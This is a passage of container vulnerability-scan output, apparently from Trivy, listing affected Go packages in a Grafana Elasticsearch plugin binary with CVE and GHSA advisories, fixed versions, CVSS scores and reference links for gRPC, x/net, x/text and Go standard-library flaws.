│                             │                   #### HTTP/2 Rapid Reset Mitigation Bypass / Denial of Service
│                             │                    via Stream Aborts
│                             │                   - Affected Component: HTTP/2 transport
│                             │                   - Impact: Earlier mitigations in grpc-go for HTTP/2 Rapid
│                             │                   Reset only applied threshold checks to items that directly
│                             │                   resulted in control frames being written back to the wire,
│                             │                   such as `SETTINGS` ACKs or server-initiated `RST_STREAM`s.
│                             │                   When a client initiated a rapid flood of stream creation
│                             │                   (`HEADERS`) immediately followed by stream termination
│                             │                   `RST_STREAM`, items queued up in the control buffer without
│                             │                   counting against the transport response frame threshold. An
│                             │                   attacker can repeatedly trigger this flood sequence to bypass
│                             │                    reader blocking, resulting in high CPU usage, and Denial of
│                             │                   Service (DoS).
│                             │                   #### Denial of Service (Panic) in xDS RBAC Engine via
│                             │                   Unsupported Fields inside NOT Rules
│                             │                   - Impact: The xDS RBAC policy translators recursively
│                             │                   generate matchers for nested rules. When a `NOT` rule wrapped
│                             │                    an unsupported or unhandled field (such as
│                             │                   `SourcedMetadata`), the recursive step returned an empty
│                             │                   matcher. This could result in a runtime panic when the RBAC
│                             │                   engine attempts to authorize an incoming request.
│                             │                   An attacker or misconfigured/malicious xDS management server
│                             │                   delivering an LDS/RDS update containing a `NOT` rule around
│                             │                   an unhandled field causes the gRPC server process to crash
│                             │                   immediately (CWE-248 / Denial of Service).
│                             │                   ### Patches
│                             │                   _Has the problem been patched? What versions should users
│                             │                   upgrade to?_
│                             │                   All three issues have been fixed in `master` and will be
│                             │                   released in 1.82.1 shortly.
│                             │                   ### Workarounds
│                             │                   _Is there a way for users to fix or remediate the
│                             │                   vulnerability without upgrading?_
│                             │                   If upgrading grpc-go immediately is not possible, apply the
│                             │                   following workarounds based on your deployment architecture:
│                             │                   * For xDS RBAC Vulnerabilities & Panics: Ensure that upstream
│                             │                    xDS management servers do not push RBAC policies containing
│                             │                   `Metadata`, `RequestedServerName`, or `NOT` rules wrapping
│                             │                   unsupported fields (such as `SourcedMetadata`) to grpc-go
│                             │                   servers.
│                             │                   * For HTTP/2 Rapid Reset DOS: Configure upstream reverse
│                             │                   proxies or load balancers (such as Envoy) with strict HTTP/2
│                             │                   `max_concurrent_streams` limits and active rate limiting on
│                             │                   `RST_STREAM` frequency per connection.
│                             │                   ### Severity
│                             │                     | Vulnerability | Qualitative Severity | Approximate CVSS
│                             │                   v3.1 Score | Primary Impact |
│                             │                     | :--- | :--- | :--- | :--- |
│                             │                     | **xDS RBAC Authorization Bypass** | **High** | `8.2` |
│                             │                   Unauthorized Access / Fail-Open |
│                             │                     | **HTTP/2 Rapid Reset DOS Bypass** | **High** | `7.5` |
│                             │                   High CPU Consumption / Denial of Service |
│                             │                     | **xDS RBAC Engine Server Panic** | **Medium** | `5.9` |
│                             │                   Process Crash / Denial of Service | 
│                             ├ Severity        : HIGH 
│                             ├ VendorSeverity   ─ ghsa: 3 
│                             ├ CVSS             ─ ghsa ╭ V40Vector: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:
│                             │                         │            H/VA:H/SC:N/SI:N/SA:N 
│                             │                         ╰ V40Score : 8.8 
│                             ├ References       ╭ [0]: https://github.com/grpc/grpc-go 
│                             │                  ├ [1]: https://github.com/grpc/grpc-go/commit/4ea465d4ab98013f
│                             │                  │      72a142fe0fc89c19770b2935 
│                             │                  ├ [2]: https://github.com/grpc/grpc-go/pull/9236 
│                             │                  ├ [3]: https://github.com/grpc/grpc-go/releases/tag/v1.82.1 
│                             │                  ╰ [4]: https://github.com/grpc/grpc-go/security/advisories/GHS
│                             │                         A-hrxh-6v49-42gf 
│                             ├ PublishedDate   : 2026-07-21T22:03:55Z 
│                             ╰ LastModifiedDate: 2026-07-21T22:03:56Z 
├ [7] ╭ Target         : usr/share/grafana/data/plugins-bundled/elasticsearch/gpx_grafana_elasticsearch_datasou
│     │                  rce_linux_amd64 
│     ├ Class          : lang-pkgs 
│     ├ Type           : gobinary 
│     ├ Packages        
│     ╰ Vulnerabilities ╭ [0] ╭ VulnerabilityID : GO-2026-5932 
│                       │     ├ PkgID           : golang.org/x/crypto@v0.52.0 
│                       │     ├ PkgName         : golang.org/x/crypto 
│                       │     ├ PkgIdentifier    ╭ PURL: pkg:golang/golang.org/x/crypto@v0.52.0 
│                       │     │                  ╰ UID : 17c17fd066ffbe84 
│                       │     ├ InstalledVersion: v0.52.0 
│                       │     ├ Status          : affected 
│                       │     ├ Layer            ╭ Digest: sha256:98a7b344c948845d318c21db5437a29354d19538e300c
│                       │     │                  │         6997c001601e2a6e5af 
│                       │     │                  ╰ DiffID: sha256:d39069cbf98f2f0d051ebefc817aed342512d10a9a172
│                       │     │                            e154f0b8ad928e980c9 
│                       │     ├ DataSource       ╭ ID  : govulndb 
│                       │     │                  ├ Name: The Go Vulnerability Database 
│                       │     │                  ╰ URL : https://pkg.go.dev/vuln/ 
│                       │     ├ Fingerprint     : sha256:d4c945e4bac116ee96375bded501c1aeb2c944a7432ac1ed4f3470
│                       │     │                   59c19edd6b 
│                       │     ├ Title           : The golang.org/x/crypto/openpgp package is unmaintained,
│                       │     │                   unsafe by design, and has known security issues 
│                       │     ├ Description     : The golang.org/x/crypto/openpgp package is unsafe by design,
│                       │     │                   has numerous known security issues, is not maintained, and
│                       │     │                   should not be used.
│                       │     │                   
│                       │     │                   If you are required to interoperate with OpenPGP systems and
│                       │     │                   need a maintained package, consider
│                       │     │                   github.com/ProtonMail/go-crypto/openpgp which is a maintained
│                       │     │                    fork that aims to be a drop-in replacement for this
│                       │     │                   package. 
│                       │     ├ Severity        : UNKNOWN 
│                       │     ╰ References       ╭ [0]: https://go.dev/issue/44226 
│                       │                        ╰ [1]: https://pkg.go.dev/vuln/GO-2026-5932 
│                       ├ [1] ╭ VulnerabilityID : CVE-2026-46600 
│                       │     ├ VendorIDs        ─ [0]: GO-2026-5942 
│                       │     ├ PkgID           : golang.org/x/net@v0.55.0 
│                       │     ├ PkgName         : golang.org/x/net 
│                       │     ├ PkgIdentifier    ╭ PURL: pkg:golang/golang.org/x/net@v0.55.0 
│                       │     │                  ╰ UID : 13c74f367f948f87 
│                       │     ├ InstalledVersion: v0.55.0 
│                       │     ├ FixedVersion    : 0.56.0 
│                       │     ├ Status          : fixed 
│                       │     ├ Layer            ╭ Digest: sha256:98a7b344c948845d318c21db5437a29354d19538e300c
│                       │     │                  │         6997c001601e2a6e5af 
│                       │     │                  ╰ DiffID: sha256:d39069cbf98f2f0d051ebefc817aed342512d10a9a172
│                       │     │                            e154f0b8ad928e980c9 
│                       │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-46600 
│                       │     ├ DataSource       ╭ ID  : govulndb 
│                       │     │                  ├ Name: The Go Vulnerability Database 
│                       │     │                  ╰ URL : https://pkg.go.dev/vuln/ 
│                       │     ├ Fingerprint     : sha256:47d7eaae1d25de7bcc2292749d480d395d9d8229058b7b50a982b5
│                       │     │                   99e9251b81 
│                       │     ├ Title           : Parsing an invalid SVCB or HTTPS RR can panic when the size
│                       │     │                   of a param ... 
│                       │     ├ Description     : Parsing an invalid SVCB or HTTPS RR can panic when the size
│                       │     │                   of a parameter value overflows the message buffer. 
│                       │     ├ Severity        : UNKNOWN 
│                       │     ├ CweIDs           ─ [0]: CWE-125 
│                       │     ├ References       ╭ [0]: https://go.dev/cl/786345 
│                       │     │                  ├ [1]: https://go.dev/issue/79795 
│                       │     │                  ╰ [2]: https://pkg.go.dev/vuln/GO-2026-5942 
│                       │     ├ PublishedDate   : 2026-07-21T20:17:01.213Z 
│                       │     ╰ LastModifiedDate: 2026-07-23T18:27:48.877Z 
│                       ├ [2] ╭ VulnerabilityID : CVE-2026-56852 
│                       │     ├ VendorIDs        ─ [0]: GO-2026-5970 
│                       │     ├ PkgID           : golang.org/x/text@v0.37.0 
│                       │     ├ PkgName         : golang.org/x/text 
│                       │     ├ PkgIdentifier    ╭ PURL: pkg:golang/golang.org/x/text@v0.37.0 
│                       │     │                  ╰ UID : 69b4d80ba371f59a 
│                       │     ├ InstalledVersion: v0.37.0 
│                       │     ├ FixedVersion    : 0.39.0 
│                       │     ├ Status          : fixed 
│                       │     ├ Layer            ╭ Digest: sha256:98a7b344c948845d318c21db5437a29354d19538e300c
│                       │     │                  │         6997c001601e2a6e5af 
│                       │     │                  ╰ DiffID: sha256:d39069cbf98f2f0d051ebefc817aed342512d10a9a172
│                       │     │                            e154f0b8ad928e980c9 
│                       │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-56852 
│                       │     ├ DataSource       ╭ ID  : govulndb 
│                       │     │                  ├ Name: The Go Vulnerability Database 
│                       │     │                  ╰ URL : https://pkg.go.dev/vuln/ 
│                       │     ├ Fingerprint     : sha256:ebc0ff0bb40479cacb5905df534369fe1ddbadac3359485306d8b6
│                       │     │                   99906dd4e1 
│                       │     ├ Title           : A norm.Iter can enter an infinite loop when handling input
│                       │     │                   containing  ... 
│                       │     ├ Description     : A norm.Iter can enter an infinite loop when handling input
│                       │     │                   containing invalid UTF-8 bytes. 
│                       │     ├ Severity        : HIGH 
│                       │     ├ CweIDs           ─ [0]: CWE-835 
│                       │     ├ VendorSeverity   ─ azure: 3 
│                       │     ├ References       ╭ [0]: https://go.dev/cl/794100 
│                       │     │                  ├ [1]: https://go.dev/issue/80142 
│                       │     │                  ├ [2]: https://nvd.nist.gov/vuln/detail/CVE-2026-56852 
│                       │     │                  ╰ [3]: https://pkg.go.dev/vuln/GO-2026-5970 
│                       │     ├ PublishedDate   : 2026-07-21T20:17:02.867Z 
│                       │     ╰ LastModifiedDate: 2026-07-23T18:27:48.877Z 
│                       ├ [3] ╭ VulnerabilityID : GHSA-hrxh-6v49-42gf 
│                       │     ├ PkgID           : google.golang.org/grpc@v1.80.0 
│                       │     ├ PkgName         : google.golang.org/grpc 
│                       │     ├ PkgIdentifier    ╭ PURL: pkg:golang/google.golang.org/grpc@v1.80.0 
│                       │     │                  ╰ UID : faaf35a9263bf76 
│                       │     ├ InstalledVersion: v1.80.0 
│                       │     ├ FixedVersion    : 1.82.1 
│                       │     ├ Status          : fixed 
│                       │     ├ Layer            ╭ Digest: sha256:98a7b344c948845d318c21db5437a29354d19538e300c
│                       │     │                  │         6997c001601e2a6e5af 
│                       │     │                  ╰ DiffID: sha256:d39069cbf98f2f0d051ebefc817aed342512d10a9a172
│                       │     │                            e154f0b8ad928e980c9 
│                       │     ├ SeveritySource  : ghsa 
│                       │     ├ PrimaryURL      : https://github.com/advisories/GHSA-hrxh-6v49-42gf 
│                       │     ├ DataSource       ╭ ID  : ghsa 
│                       │     │                  ├ Name: GitHub Security Advisory Go 
│                       │     │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ec
│                       │     │                          osystem%3Ago 
│                       │     ├ Fingerprint     : sha256:3713a160bb68bd3c418979bed255539588a6394e734b07d771459d
│                       │     │                   13c0c77f1b 
│                       │     ├ Title           : gRPC-Go: xDS RBAC and HTTP/2 Vulnerabilities 
│                       │     ├ Description     : Multiple security vulnerabilities have been identified and
│                       │     │                   addressed in grpc-go affecting the xDS RBAC authorization
│                       │     │                   engine (internal/xds/rbac) and the HTTP/2 transport server
│                       │     │                   implementation (internal/transport). These vulnerabilities
│                       │     │                   could result in:
│                       │     │                   
│                       │     │                   - Authorization Bypass (Fail-Open) when translating xDS RBAC
│                       │     │                   policies containing `Metadata` or `RequestedServerName`
│                       │     │                   fields.
│                       │     │                   - Denial of Service (High CPU Consumption) due to an HTTP/2
│                       │     │                   Rapid Reset mitigation bypass during client-initiated stream
│                       │     │                   resets.
│                       │     │                   - Denial of Service (Server Panic) when parsing crafted xDS
│                       │     │                   RBAC policies containing `NOT` rules around unsupported
│                       │     │                   ### Impact
│                       │     │                   _What kind of vulnerability is it? Who is impacted?_
│                       │     │                   #### xDS RBAC Authorization Bypass via `Metadata` &
│                       │     │                   `RequestedServerName` matchers
│                       │     │                   - Affected Component: xDS RBAC 
│                       │     │                   - Impact: When building policy matchers for gRPC RBAC from
│                       │     │                   xDS configurations, unsupported `permission` and `principal`
│                       │     │                   rules (specifically `Metadata` and `RequestedServerName`)
│                       │     │                   were silently ignored and treated as no-ops.
│                       │     │                     - If an authorization policy relied purely on these
│                       │     │                   matchers for access control, treating those rules as no-ops
│                       │     │                   effectively removed the restrictions.
│                       │     │                   - If these unsupported rules were nested inside logical `NOT`
│                       │     │                    rules (`Permission_NotRule` / `Principal_NotId`) or
│                       │     │                   multi-condition `OR/AND` rules, silently dropping them
│                       │     │                   changed the boolean logic flow of the authorization engine.
│                       │     │                   As a result, policy evaluation decisions could fail open,
│                       │     │                   allowing unauthorized clients to access protected gRPC
│                       │     │                   services or resources.
│                       │     │                   #### HTTP/2 Rapid Reset Mitigation Bypass / Denial of Service
│                       │     │                    via Stream Aborts
│                       │     │                   - Affected Component: HTTP/2 transport
│                       │     │                   - Impact: Earlier mitigations in grpc-go for HTTP/2 Rapid
│                       │     │                   Reset only applied threshold checks to items that directly
│                       │     │                   resulted in control frames being written back to the wire,
│                       │     │                   such as `SETTINGS` ACKs or server-initiated `RST_STREAM`s.
│                       │     │                   When a client initiated a rapid flood of stream creation
│                       │     │                   (`HEADERS`) immediately followed by stream termination
│                       │     │                   `RST_STREAM`, items queued up in the control buffer without
│                       │     │                   counting against the transport response frame threshold. An
│                       │     │                   attacker can repeatedly trigger this flood sequence to bypass
│                       │     │                    reader blocking, resulting in high CPU usage, and Denial of
│                       │     │                   Service (DoS).
│                       │     │                   #### Denial of Service (Panic) in xDS RBAC Engine via
│                       │     │                   Unsupported Fields inside NOT Rules
│                       │     │                   - Impact: The xDS RBAC policy translators recursively
│                       │     │                   generate matchers for nested rules. When a `NOT` rule wrapped
│                       │     │                    an unsupported or unhandled field (such as
│                       │     │                   `SourcedMetadata`), the recursive step returned an empty
│                       │     │                   matcher. This could result in a runtime panic when the RBAC
│                       │     │                   engine attempts to authorize an incoming request.
│                       │     │                   An attacker or misconfigured/malicious xDS management server
│                       │     │                   delivering an LDS/RDS update containing a `NOT` rule around
│                       │     │                   an unhandled field causes the gRPC server process to crash
│                       │     │                   immediately (CWE-248 / Denial of Service).
│                       │     │                   ### Patches
│                       │     │                   _Has the problem been patched? What versions should users
│                       │     │                   upgrade to?_
│                       │     │                   All three issues have been fixed in `master` and will be
│                       │     │                   released in 1.82.1 shortly.
│                       │     │                   ### Workarounds
│                       │     │                   _Is there a way for users to fix or remediate the
│                       │     │                   vulnerability without upgrading?_
│                       │     │                   If upgrading grpc-go immediately is not possible, apply the
│                       │     │                   following workarounds based on your deployment architecture:
│                       │     │                   * For xDS RBAC Vulnerabilities & Panics: Ensure that upstream
│                       │     │                    xDS management servers do not push RBAC policies containing
│                       │     │                   `Metadata`, `RequestedServerName`, or `NOT` rules wrapping
│                       │     │                   unsupported fields (such as `SourcedMetadata`) to grpc-go
│                       │     │                   servers.
│                       │     │                   * For HTTP/2 Rapid Reset DOS: Configure upstream reverse
│                       │     │                   proxies or load balancers (such as Envoy) with strict HTTP/2
│                       │     │                   `max_concurrent_streams` limits and active rate limiting on
│                       │     │                   `RST_STREAM` frequency per connection.
│                       │     │                   ### Severity
│                       │     │                     | Vulnerability | Qualitative Severity | Approximate CVSS
│                       │     │                   v3.1 Score | Primary Impact |
│                       │     │                     | :--- | :--- | :--- | :--- |
│                       │     │                     | **xDS RBAC Authorization Bypass** | **High** | `8.2` |
│                       │     │                   Unauthorized Access / Fail-Open |
│                       │     │                     | **HTTP/2 Rapid Reset DOS Bypass** | **High** | `7.5` |
│                       │     │                   High CPU Consumption / Denial of Service |
│                       │     │                     | **xDS RBAC Engine Server Panic** | **Medium** | `5.9` |
│                       │     │                   Process Crash / Denial of Service | 
│                       │     ├ Severity        : HIGH 
│                       │     ├ VendorSeverity   ─ ghsa: 3 
│                       │     ├ CVSS             ─ ghsa ╭ V40Vector: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:
│                       │     │                         │            H/VA:H/SC:N/SI:N/SA:N 
│                       │     │                         ╰ V40Score : 8.8 
│                       │     ├ References       ╭ [0]: https://github.com/grpc/grpc-go 
│                       │     │                  ├ [1]: https://github.com/grpc/grpc-go/commit/4ea465d4ab98013f
│                       │     │                  │      72a142fe0fc89c19770b2935 
│                       │     │                  ├ [2]: https://github.com/grpc/grpc-go/pull/9236 
│                       │     │                  ├ [3]: https://github.com/grpc/grpc-go/releases/tag/v1.82.1 
│                       │     │                  ╰ [4]: https://github.com/grpc/grpc-go/security/advisories/GHS
│                       │     │                         A-hrxh-6v49-42gf 
│                       │     ├ PublishedDate   : 2026-07-21T22:03:55Z 
│                       │     ╰ LastModifiedDate: 2026-07-21T22:03:56Z 
│                       ├ [4] ╭ VulnerabilityID : CVE-2026-27145 
│                       │     ├ VendorIDs        ─ [0]: GO-2026-5037 
│                       │     ├ PkgID           : stdlib@v1.26.3 
│                       │     ├ PkgName         : stdlib 
│                       │     ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.26.3 
│                       │     │                  ╰ UID : f77aad5d3fa73e61 
│                       │     ├ InstalledVersion: v1.26.3 
│                       │     ├ FixedVersion    : 1.25.11, 1.26.4 
│                       │     ├ Status          : fixed 
│                       │     ├ Layer            ╭ Digest: sha256:98a7b344c948845d318c21db5437a29354d19538e300c
│                       │     │                  │         6997c001601e2a6e5af 
│                       │     │                  ╰ DiffID: sha256:d39069cbf98f2f0d051ebefc817aed342512d10a9a172
│                       │     │                            e154f0b8ad928e980c9 
│                       │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-27145 
│                       │     ├ DataSource       ╭ ID  : govulndb 
│                       │     │                  ├ Name: The Go Vulnerability Database 
│                       │     │                  ╰ URL : https://pkg.go.dev/vuln/ 
│                       │     ├ Fingerprint     : sha256:52b7d19fbe92f958fe241f8a02da820147e5eedf7193022a93d301
│                       │     │                   fdb7285f0f 
│                       │     ├ Title           : crypto/x509: golang: golang crypto/x509: Denial of Service
│                       │     │                   via excessive processing of DNS SAN entries 
│                       │     ├ Description     : (*x509.Certificate).VerifyHostname previously called
│                       │     │                   matchHostnames in a loop over all DNS Subject Alternative
│                       │     │                   Name (SAN) entries. This caused strings.Split(host, ".") to
│                       │     │                   execute repeatedly on the same input hostname. With a large
│                       │     │                   DNS SAN list, verification costs scaled quadratically based
│                       │     │                   on the number of SAN entries multiplied by the hostname's
│                       │     │                   label count. Because x509.Verify validates hostnames before
│                       │     │                   building the certificate chain, this overhead occurred even
│                       │     │                   for untrusted certificates. 
│                       │     ├ Severity        : HIGH 
│                       │     ├ CweIDs           ─ [0]: CWE-606 
│                       │     ├ VendorSeverity   ╭ alma       : 3 
│                       │     │                  ├ amazon     : 2 
│                       │     │                  ├ bitnami    : 2 
│                       │     │                  ├ oracle-oval: 3 
│                       │     │                  ├ redhat     : 3 
│                       │     │                  ╰ rocky      : 3 
│                       │     ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L
│                       │     │                  │         │           /A:H 
│                       │     │                  │         ╰ V3Score : 6.5 
│                       │     │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N
│                       │     │                            │           /A:H 
│                       │     │                            ╰ V3Score : 7.5 
│                       │     ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:23262 
│                       │     │                  ├ [1] : https://access.redhat.com/errata/RHSA-2026:23264 
│                       │     │                  ├ [2] : https://access.redhat.com/errata/RHSA-2026:29981 
│                       │     │                  ├ [3] : https://access.redhat.com/errata/RHSA-2026:33574 
│                       │     │                  ├ [4] : https://access.redhat.com/errata/RHSA-2026:34357 
│                       │     │                  ├ [5] : https://access.redhat.com/errata/RHSA-2026:34359 
│                       │     │                  ├ [6] : https://access.redhat.com/errata/RHSA-2026:35832 
│                       │     │                  ├ [7] : https://access.redhat.com/errata/RHSA-2026:36317 
│                       │     │                  ├ [8] : https://access.redhat.com/errata/RHSA-2026:36648 
│                       │     │                  ├ [9] : https://access.redhat.com/errata/RHSA-2026:36797 
│                       │     │                  ├ [10]: https://access.redhat.com/errata/RHSA-2026:38995 
│                       │     │                  ├ [11]: https://access.redhat.com/errata/RHSA-2026:39005 
│                       │     │                  ├ [12]: https://access.redhat.com/errata/RHSA-2026:39573 
│                       │     │                  ├ [13]: https://access.redhat.com/errata/RHSA-2026:39879 
│                       │     │                  ├ [14]: https://access.redhat.com/errata/RHSA-2026:41030 
│                       │     │                  ├ [15]: https://access.redhat.com/errata/RHSA-2026:41036 
│                       │     │                  ├ [16]: https://access.redhat.com/errata/RHSA-2026:41930 
│                       │     │                  ├ [17]: https://access.redhat.com/errata/RHSA-2026:42043 
│                       │     │                  ├ [18]: https://access.redhat.com/errata/RHSA-2026:42047 
│                       │     │                  ├ [19]: https://access.redhat.com/errata/RHSA-2026:42049 
│                       │     │                  ├ [20]: https://access.redhat.com/errata/RHSA-2026:42050 
│                       │     │                  ├ [21]: https://access.redhat.com/errata/RHSA-2026:42051 
│                       │     │                  ├ [22]: https://access.redhat.com/errata/RHSA-2026:42079 
│                       │     │                  ├ [23]: https://access.redhat.com/errata/RHSA-2026:42080 
│                       │     │                  ├ [24]: https://access.redhat.com/errata/RHSA-2026:42082 
│                       │     │                  ├ [25]: https://access.redhat.com/errata/RHSA-2026:42142 
│                       │     │                  ├ [26]: https://access.redhat.com/errata/RHSA-2026:42150 
│                       │     │                  ├ [27]: https://access.redhat.com/errata/RHSA-2026:42151 
│                       │     │                  ├ [28]: https://access.redhat.com/errata/RHSA-2026:42240 
│                       │     │                  ├ [29]: https://access.redhat.com/errata/RHSA-2026:42644 
│                       │     │                  ├ [30]: https://access.redhat.com/errata/RHSA-2026:42946 
│                       │     │                  ├ [31]: https://access.redhat.com/errata/RHSA-2026:44622 
│                       │     │                  ├ [32]: https://access.redhat.com/errata/RHSA-2026:46394 
│                       │     │                  ├ [33]: https://access.redhat.com/errata/RHSA-2026:46395 
│                       │     │                  ├ [34]: https://access.redhat.com/errata/RHSA-2026:47149 
│                       │     │                  ├ [35]: https://access.redhat.com/errata/RHSA-2026:47735 
│                       │     │                  ├ [36]: https://access.redhat.com/errata/RHSA-2026:47737 
│                       │     │                  ├ [37]: https://access.redhat.com/security/cve/CVE-2026-27145 
│                       │     │                  ├ [38]: https://bugzilla.redhat.com/2445356 
│                       │     │                  ├ [39]: https://bugzilla.redhat.com/2484207 
│                       │     │                  ├ [40]: https://bugzilla.redhat.com/show_bug.cgi?id=2480756 
│                       │     │                  ├ [41]: https://bugzilla.redhat.com/show_bug.cgi?id=2484207 
│                       │     │                  ├ [42]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-202
│                       │     │                  │       6-27145 
│                       │     │                  ├ [43]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-202
│                       │     │                  │       6-39821 
│                       │     │                  ├ [44]: https://errata.almalinux.org/9/ALSA-2026-36317.html 
│                       │     │                  ├ [45]: https://errata.rockylinux.org/RLSA-2026:46395 
│                       │     │                  ├ [46]: https://go.dev/cl/783621 
│                       │     │                  ├ [47]: https://go.dev/issue/79694 
│                       │     │                  ├ [48]: https://groups.google.com/g/golang-announce/c/tKs3rmcB
│                       │     │                  │       cKw 
│                       │     │                  ├ [49]: https://linux.oracle.com/cve/CVE-2026-27145.html 
│                       │     │                  ├ [50]: https://linux.oracle.com/errata/ELSA-2026-46395.html 
│                       │     │                  ├ [51]: https://nvd.nist.gov/vuln/detail/CVE-2026-27145 
│                       │     │                  ├ [52]: https://pkg.go.dev/vuln/GO-2026-5037 
│                       │     │                  ├ [53]: https://security.access.redhat.com/data/csaf/v2/vex/20
│                       │     │                  │       26/cve-2026-27145.json 
│                       │     │                  ╰ [54]: https://www.cve.org/CVERecord?id=CVE-2026-27145 
│                       │     ├ PublishedDate   : 2026-06-02T23:16:35.57Z 
│                       │     ╰ LastModifiedDate: 2026-07-29T13:17:57.147Z 
│                       ├ [5] ╭ VulnerabilityID : CVE-2026-39822 
│                       │     ├ VendorIDs        ─ [0]: GO-2026-4970 
│                       │     ├ PkgID           : stdlib@v1.26.3 
│                       │     ├ PkgName         : stdlib 
│                       │     ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.26.3 
│                       │     │                  ╰ UID : f77aad5d3fa73e61 
│                       │     ├ InstalledVersion: v1.26.3 
│                       │     ├ FixedVersion    : 1.25.12, 1.26.5, 1.27.0-rc.2 
│                       │     ├ Status          : fixed 
│                       │     ├ Layer            ╭ Digest: sha256:98a7b344c948845d318c21db5437a29354d19538e300c
│                       │     │                  │         6997c001601e2a6e5af 
│                       │     │                  ╰ DiffID: sha256:d39069cbf98f2f0d051ebefc817aed342512d10a9a172
│                       │     │                            e154f0b8ad928e980c9 
│                       │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-39822 
│                       │     ├ DataSource       ╭ ID  : govulndb 
│                       │     │                  ├ Name: The Go Vulnerability Database 
│                       │     │                  ╰ URL : https://pkg.go.dev/vuln/ 
│                       │     ├ Fingerprint     : sha256:6f1a5808c82eec43556a1602a9b72ae0fa6356d54bcf4495bf4a70
│                       │     │                   843df851a8 
│                       │     ├ Title           : os: golang: Go os.Root: Symlink following vulnerability
│                       │     │                   allows directory traversal 
│                       │     ├ Description     : On Unix systems, opening a file in an os.Root improperly
│                       │     │                   follows symlinks to locations outside of the Root when the
│                       │     │                   final path component of the a path is a symbolic link and the
│                       │     │                    path ends in /. For example, 'root.Open("symlink/")' will
│                       │     │                   open "symlink" even when "symlink" is a symbolic link
│                       │     │                   pointing outside of the root. 
│                       │     ├ Severity        : HIGH 
│                       │     ├ CweIDs           ─ [0]: CWE-61 
│                       │     ├ VendorSeverity   ╭ alma       : 3 
│                       │     │                  ├ amazon     : 2 
│                       │     │                  ├ bitnami    : 3 
│                       │     │                  ├ oracle-oval: 3 
│                       │     │                  ├ redhat     : 3 
│                       │     │                  ╰ rocky      : 3 
│                       │     ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H
│                       │     │                  │         │           /A:H 
│                       │     │                  │         ╰ V3Score : 7.8 
│                       │     │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H
│                       │     │                            │           /A:H 
│                       │     │                            ╰ V3Score : 7.8 
│                       │     ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:38878 
│                       │     │                  ├ [1] : https://access.redhat.com/security/cve/CVE-2026-39822 
│                       │     │                  ├ [2] : https://bugzilla.redhat.com/2498152 
│                       │     │                  ├ [3] : https://bugzilla.redhat.com/show_bug.cgi?id=2498152 
│                       │     │                  ├ [4] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-202
│                       │     │                  │       6-39822 
│                       │     │                  ├ [5] : https://errata.almalinux.org/9/ALSA-2026-38878.html 
│                       │     │                  ├ [6] : https://errata.rockylinux.org/RLSA-2026:38495 
│                       │     │                  ├ [7] : https://go.dev/cl/797880 
│                       │     │                  ├ [8] : https://go.dev/issue/79005 
│                       │     │                  ├ [9] : https://groups.google.com/g/golang-announce/c/OrmQE_Yp
│                       │     │                  │       5Sc 
│                       │     │                  ├ [10]: https://linux.oracle.com/cve/CVE-2026-39822.html 
│                       │     │                  ├ [11]: https://linux.oracle.com/errata/ELSA-2026-38995.html 
│                       │     │                  ├ [12]: https://nvd.nist.gov/vuln/detail/CVE-2026-39822 
│                       │     │                  ├ [13]: https://pkg.go.dev/vuln/GO-2026-4970 
│                       │     │                  ╰ [14]: https://www.cve.org/CVERecord?id=CVE-2026-39822 
│                       │     ├ PublishedDate   : 2026-07-08T17:17:21.31Z 
│                       │     ╰ LastModifiedDate: 2026-07-13T14:54:26.317Z 
│                       ├ [6] ╭ VulnerabilityID : CVE-2026-42504 
│                       │     ├ VendorIDs        ─ [0]: GO-2026-5038 
│                       │     ├ PkgID           : stdlib@v1.26.3 
│                       │     ├ PkgName         : stdlib 
│                       │     ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.26.3 
│                       │     │                  ╰ UID : f77aad5d3fa73e61 
│                       │     ├ InstalledVersion: v1.26.3 
│                       │     ├ FixedVersion    : 1.25.11, 1.26.4 
│                       │     ├ Status          : fixed 
│                       │     ├ Layer            ╭ Digest: sha256:98a7b344c948845d318c21db5437a29354d19538e300c
│                       │     │                  │         6997c001601e2a6e5af 
│                       │     │                  ╰ DiffID: sha256:d39069cbf98f2f0d051ebefc817aed342512d10a9a172
│                       │     │                            e154f0b8ad928e980c9 
│                       │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42504 
│                       │     ├ DataSource       ╭ ID  : govulndb 
│                       │     │                  ├ Name: The Go Vulnerability Database 
│                       │     │                  ╰ URL : https://pkg.go.dev/vuln/ 
│                       │     ├ Fingerprint     : sha256:ff1faaa25bb4608d8be1bd879d579a6614c9e42f8eab886a791199
│                       │     │                   d7abeea94c 
│                       │     ├ Title           : mime: golang: Golang MIME: Denial of Service via
│                       │     │                   maliciously-crafted MIME header 
│                       │     ├ Description     : Decoding a maliciously-crafted MIME header containing many
│                       │     │                   invalid encoded-words can consume excessive CPU. 
│                       │     ├ Severity        : HIGH 
│                       │     ├ CweIDs           ─ [0]: CWE-407 
│                       │     ├ VendorSeverity   ╭ amazon : 2 
│                       │     │                  ├ azure  : 3 
│                       │     │                  ├ bitnami: 3 
│                       │     │                  ╰ redhat : 3 
│                       │     ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N
